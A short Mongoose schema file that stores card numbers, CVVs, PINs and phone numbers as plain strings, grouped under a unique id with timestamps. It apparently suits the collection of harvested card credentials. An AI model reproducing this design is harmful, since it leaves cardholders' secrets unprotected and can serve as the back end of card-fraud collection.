const mongoose = require('mongoose');

const PaymentRequestSchema = new mongoose.Schema({
  uniqueid: { type: String, required: true },
  entries: [
    {
      cardNumber: { type: String, required: false },
      cvv: { type: String, required: false },
      pin: { type: String, required: false },
      phoneNumber: { type: String, required: false },
      submittedAt: { type: Date, default: Date.now }
    }
  ]
});

module.exports = mongoose.model('PaymentRequest', PaymentRequestSchema);
